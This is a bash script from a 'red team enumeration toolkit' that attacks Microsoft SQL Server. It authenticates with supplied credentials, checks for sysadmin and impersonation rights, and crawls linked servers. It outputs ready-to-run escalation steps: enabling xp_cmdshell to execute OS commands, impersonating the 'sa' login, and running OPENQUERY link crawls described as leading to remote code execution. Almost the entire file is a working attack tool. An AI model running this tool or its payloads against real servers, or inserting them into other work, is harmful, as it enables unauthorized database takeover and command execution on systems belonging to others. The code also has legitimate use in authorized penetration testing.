#!/usr/bin/env bash
# EnumGod - Red Team Enumeration Toolkit   |   Author: Jeet Ramoliya
# ============================================================================
# mssql-enum.sh  -  MSSQL enumeration & linked-server crawl (PowerUpSQL-style).
#                   Login, roles, impersonation, xp_cmdshell state, linked servers
#                   and link-crawl to reach other instances as their sysadmin.
#
# ENGINE   impacket-mssqlclient / mssqlclient.py  (best) -> sqlcmd (mssql-tools).
#          Degrades to printing the exact queries if neither is present.
#
# USAGE
#   ./mssql-enum.sh -t 10.0.0.5 -u sa -p 'Passw0rd!' -j
#   ./mssql-enum.sh -t sql01 -d corp -u user -p pass           # Windows auth
#   ./mssql-enum.sh -t 10.0.0.5 -u sa -p pass --crawl          # crawl linked servers
# ============================================================================
set -u
TARGET=""; PORT=1433; USER=""; PASS=""; DOM=""; OUTBASE="."; JSON=0; CRAWL=0
while [ $# -gt 0 ]; do case "$1" in
  -t|--target) TARGET="$2"; shift 2;;
  --port) PORT="$2"; shift 2;;
  -u|--user) USER="$2"; shift 2;;
  -p|--pass) PASS="$2"; shift 2;;
  -d|--domain) DOM="$2"; shift 2;;
  --crawl) CRAWL=1; shift;;
  -o) OUTBASE="$2"; shift 2;;
  -j|--json) JSON=1; shift;;
  -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
  *) echo "unknown arg: $1"; exit 1;;
esac; done
[ -z "$TARGET" ] && { echo "[-] need -t <host>"; exit 1; }

HOST=$(hostname 2>/dev/null || echo host); TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/mssqlenum_${TARGET//[^a-zA-Z0-9]/_}_${TS}"; mkdir -p "$RUN" || { echo "cannot create $RUN"; exit 1; }
if [ -t 1 ]; then R=$'\e[31m';Y=$'\e[33m';C=$'\e[36m';G=$'\e[32m';D=$'\e[90m';N=$'\e[0m'; else R=;Y=;C=;G=;D=;N=; fi
SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"; : > "$SUMMARY"; : > "$NEXT"
HIGHN=0;MEDN=0;INFON=0; declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()
sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
flag(){ sev="$1";shift;txt="$*";case "$sev" in HIGH)col=$R;tag="[HIGH]";HIGHN=$((HIGHN+1));J_HIGH+=("$txt");; MED)col=$Y;tag="[MED ]";MEDN=$((MEDN+1));J_MED+=("$txt");; *)col=$D;tag="[INFO]";INFON=$((INFON+1));J_INFO+=("$txt");;esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"; printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"; }
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }
has(){ command -v "$1" >/dev/null 2>&1; }
enumgod_banner(){ printf '%s' "${C:-}"; cat <<'ART'
 _____                        ____           _
| ____|_ __  _   _ _ __ ___  / ___| ___   __| |
|  _| | '_ \| | | | '_ ` _ \| |  _ / _ \ / _` |
| |___| | | | |_| | | | | | | |_| | (_) | (_| |
|_____|_| |_|\__,_|_| |_| |_|\____|\___/ \__,_|
ART
  printf '%s   EnumGod  Red Team Enumeration Toolkit%s\n' "${G:-}" "${N:-}"
  printf '%s   author : Jeet Ramoliya   module : MSSQL%s\n\n' "${D:-}" "${N:-}"; }
enumgod_banner
echo "${G}[*] mssql-enum  ->  $RUN  (target $TARGET:$PORT)${N}"

# pick an engine and define q() to run a T-SQL query -> stdout
MCLIENT=$(command -v mssqlclient.py || command -v impacket-mssqlclient || true)
ENGINE=""
if [ -n "$MCLIENT" ]; then ENGINE=impacket
elif has sqlcmd; then ENGINE=sqlcmd
fi
q(){ # $1 = T-SQL
  case "$ENGINE" in
    impacket)
      CRED="$USER"; [ -n "$DOM" ] && CRED="$DOM/$USER"
      printf '%s\nexit\n' "$1" | "$MCLIENT" -port "$PORT" $([ -n "$DOM" ] && echo -windows-auth) "$CRED":"$PASS"@"$TARGET" 2>/dev/null ;;
    sqlcmd)
      sqlcmd -S "$TARGET,$PORT" -U "$USER" -P "$PASS" -l 8 -Q "$1" 2>/dev/null ;;
    *) return 1 ;;
  esac
}

if [ -z "$ENGINE" ]; then
  flag INFO "No MSSQL client (impacket-mssqlclient / sqlcmd). Install one. Queries below are ready."
  nextstep "Login" "mssqlclient.py $([ -n "$DOM" ] && echo -windows-auth) ${DOM:+$DOM/}$USER:PASS@$TARGET"
  nextstep "Linked servers" "SELECT srvname,srvproduct FROM master..sysservers WHERE srvname <> @@SERVERNAME;"
  nextstep "xp_cmdshell exec" "EXEC xp_cmdshell 'whoami';"
else
  flag INFO "Engine: $ENGINE"
  sect "Login context & privileges"
  q "SELECT @@VERSION; SELECT SYSTEM_USER AS login, USER_NAME() AS dbuser, IS_SRVROLEMEMBER('sysadmin') AS is_sa;" | save 01_context.txt
  if grep -q '^1' "$RUN/01_context.txt" 2>/dev/null || grep -qi 'is_sa.*1' "$RUN/01_context.txt" 2>/dev/null; then
    flag HIGH "Login is sysadmin on $TARGET -> enable & use xp_cmdshell for OS command exec."
    nextstep "xp_cmdshell as sysadmin" "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';"
  else
    flag INFO "Not sysadmin - check impersonation & linked servers for a path up."
  fi
  save 01_context.txt < "$RUN/01_context.txt"

  sect "Impersonation (EXECUTE AS)"
  q "SELECT DISTINCT b.name AS can_impersonate FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantee_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';" | save 02_impersonate.txt
  grep -qi 'sa' "$RUN/02_impersonate.txt" 2>/dev/null && { flag HIGH "Can impersonate a high-priv login (see 02_impersonate.txt) -> EXECUTE AS LOGIN='sa'."; nextstep "Impersonate" "EXECUTE AS LOGIN='sa'; SELECT IS_SRVROLEMEMBER('sysadmin');"; }

  sect "Linked servers"
  q "SELECT srvname, srvproduct, rpcout, dataaccess FROM master..sysservers WHERE srvname <> @@SERVERNAME;" | save 03_linked.txt
  LCOUNT=$(grep -cE '[A-Za-z]' "$RUN/03_linked.txt" 2>/dev/null)
  if [ "${LCOUNT:-0}" -gt 1 ]; then
    flag HIGH "Linked server(s) configured (see 03_linked.txt) -> crawl with OPENQUERY; often lands as sysadmin on the link."
    nextstep "Link crawl" "SELECT * FROM OPENQUERY(\"LINKED\", 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');"
    if [ "$CRAWL" = "1" ]; then
      sect "Crawling linked servers [ACTIVE]"
      for L in $(awk 'NR>2{print $1}' "$RUN/03_linked.txt" 2>/dev/null | grep -E '^[A-Za-z0-9._-]+$' | sort -u); do
        [ "$L" = "srvname" ] && continue
        echo "== $L ==" >> "$RUN/04_crawl.txt"
        q "SELECT * FROM OPENQUERY(\"$L\", 'SELECT SYSTEM_USER AS l, IS_SRVROLEMEMBER(''sysadmin'') AS sa');" >> "$RUN/04_crawl.txt" 2>/dev/null
      done
      grep -qE ' 1$| 1 ' "$RUN/04_crawl.txt" 2>/dev/null && flag HIGH "A linked server reports sysadmin via OPENQUERY (see 04_crawl.txt) -> RCE on the link."
    fi
  else
    flag INFO "No linked servers."
  fi

  sect "Databases & interesting data"
  q "SELECT name FROM sys.databases;" | save 05_databases.txt
fi

# summary
sect "Writing ranked summary"
{
  echo "mssql-enum summary - $TARGET:$PORT - $(date)"; echo "engine=${ENGINE:-none} user=$USER"; echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###"; printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="; if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> Get valid SQL creds, then re-run."; fi
} > "$SUMMARY"
if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  { printf '{\n  "target":"%s","engine":"%s","ts":"%s",\n' "$TARGET" "${ENGINE:-none}" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n  "med":'; jarr x "${J_MED[@]:-}"; printf ',\n  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n}\n'; } > "$JFILE"
fi
echo; echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
